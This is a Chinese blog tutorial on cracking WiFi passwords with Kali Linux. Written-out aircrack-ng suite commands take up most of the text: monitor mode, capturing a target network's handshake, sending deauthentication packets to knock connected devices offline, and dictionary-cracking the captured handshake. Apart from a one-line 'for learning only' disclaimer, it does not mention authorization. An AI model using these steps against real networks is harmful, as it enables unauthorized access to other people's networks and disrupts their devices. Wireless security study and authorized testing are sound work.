---
title: "使用Kali爆破WIFI密码"
description: "使用Kali爆破WIFI密码"
keywords: "wifi"

date: 2023-06-16T16:41:30+08:00
lastmod: 2023-06-16T16:41:30+08:00

categories:
  - Linux
tags:
  - Linux
  - 工具使用
---

# 使用kali爆破WiFi密码

## 首先准备一个免驱的kali无线网卡

## 过程

#### 插上无线网卡，让虚拟机的kali连接上无线网卡

![image-20210717201315738](https://picture-czy.oss-cn-beijing.aliyuncs.com/homeWinDir/20210717201322.png#crop=0&crop=0&crop=1&crop=1&id=p7iCa&originHeight=331&originWidth=1057&originalType=binary&ratio=1&rotation=0&showTitle=true&status=done&style=none&title=image-20210717201315738 "image-20210717201315738")

#### 打开终端，使用ifconfig查看网卡信息

![image-20210717202637731](https://picture-czy.oss-cn-beijing.aliyuncs.com/homeWinDir/20210717202637.png#crop=0&crop=0&crop=1&crop=1&id=Oku4l&originHeight=513&originWidth=812&originalType=binary&ratio=1&rotation=0&showTitle=true&status=done&style=none&title=image-20210717202637731 "image-20210717202637731")

可以看到`wlan0`就是无线网卡

> **注意：** 以下命令都在`root`模式下执行


#### 为无线网卡开启监听模式

```bash
airmon-ng start wlan0
```

![image-20210717203432962](https://picture-czy.oss-cn-beijing.aliyuncs.com/homeWinDir/20210717203433.png#crop=0&crop=0&crop=1&crop=1&id=CjztX&originHeight=515&originWidth=811&originalType=binary&ratio=1&rotation=0&showTitle=true&status=done&style=none&title=image-20210717203432962 "image-20210717203432962")

若遇到提示，则运行提示里的命令即可

再次使用`ifconfig`命令查看是否被监听

![image-20210717203658914](https://picture-czy.oss-cn-beijing.aliyuncs.com/homeWinDir/20210717203658.png#crop=0&crop=0&crop=1&crop=1&id=egd9W&originHeight=507&originWidth=816&originalType=binary&ratio=1&rotation=0&showTitle=true&status=done&style=none&title=image-20210717203658914 "image-20210717203658914")

若后面出现`mon`则说明已经被监听

#### 扫描附近的WiFi

```bash
airodump-ng wlan0mon
```

![image-20210717203955962](https://picture-czy.oss-cn-beijing.aliyuncs.com/homeWinDir/20210717203956.png#crop=0&crop=0&crop=1&crop=1&id=ojUHO&originHeight=506&originWidth=815&originalType=binary&ratio=1&rotation=0&showTitle=true&status=done&style=none&title=image-20210717203955962 "image-20210717203955962")

```bash
BSSID  表示MAC地址
PWR    表示信号 -------排名越靠前的信号越好
CH     表示信号道
ESSID  表示WiFi名称
```

大概稳定之后可以使用`Ctrl + C`结束扫描

#### 抓包 

```bash
airodump-ng --bssid 02:4B:F3:00:7E:D7 -c 6 --write /home/kali/demo wlan0mon
--bssid 表示目标WiFi的MAC地址
-c 表示目标WiFi所处的信号道
--wirte 表示抓到的包所在的文件地址（/home/kali/  为文件目录）
```

![image-20210717205325099](https://picture-czy.oss-cn-beijing.aliyuncs.com/homeWinDir/20210717205325.png#crop=0&crop=0&crop=1&crop=1&id=ae3s8&originHeight=512&originWidth=822&originalType=binary&ratio=1&rotation=0&showTitle=true&status=done&style=none&title=image-20210717205325099 "image-20210717205325099")

**若红框中并没有内容则说明还没抓到数据包**，这时需要有人连接上WiFi或者**让连接的设备下线，让设备再次自动连接WiFi，这时就可以抓取到握手包**

我们选择后者的操作，重新打开新的终端，使用命令

```bash
sudo aireplay-ng -0 3 -a 02:4B:F3:00:7E:D7 wlan0mon
-0   表示发送攻击的数据包个数
-a   表示目标WiFi的MAC地址
```

![image-20210717210733305](https://picture-czy.oss-cn-beijing.aliyuncs.com/homeWinDir/20210717210733.png#crop=0&crop=0&crop=1&crop=1&id=h0mNs&originHeight=202&originWidth=810&originalType=binary&ratio=1&rotation=0&showTitle=true&status=done&style=none&title=image-20210717210733305 "image-20210717210733305")

这个时候可以发现上一个终端所标的红框处已经有了内容，说明抓包成功

![image-20210717210905193](https://picture-czy.oss-cn-beijing.aliyuncs.com/homeWinDir/20210717210905.png#crop=0&crop=0&crop=1&crop=1&id=PAT2V&originHeight=511&originWidth=811&originalType=binary&ratio=1&rotation=0&showTitle=true&status=done&style=none&title=image-20210717210905193 "image-20210717210905193")

来到保存握手包的目录，可以发现握手包已经放在了此目录下

![image-20210717211315378](https://picture-czy.oss-cn-beijing.aliyuncs.com/homeWinDir/20210717211315.png#crop=0&crop=0&crop=1&crop=1&id=i0AxM&originHeight=278&originWidth=812&originalType=binary&ratio=1&rotation=0&showTitle=true&status=done&style=none&title=image-20210717211315378 "image-20210717211315378")

#### 使用密码字典进行爆破

密码字典可以使用网上找的，也可以使用kali自带的

来到密码字典所在的目录，执行下面命令

```bash
aircrack-ng -w FastPwds.txt /home/kali/demo-01.cap
-w   表示密码字典
/home/kali/demo-01.cap  则是握手包
```

![image-20210717211755386](https://picture-czy.oss-cn-beijing.aliyuncs.com/homeWinDir/20210717211755.png#crop=0&crop=0&crop=1&crop=1&id=haTrS&originHeight=513&originWidth=814&originalType=binary&ratio=1&rotation=0&showTitle=true&status=done&style=none&title=image-20210717211755386 "image-20210717211755386")

啪的一下，很快啊，就爆破完了(前提密码很简单)，红框中的内容就是密码

**注意：本方法只是用来学习和交流的**
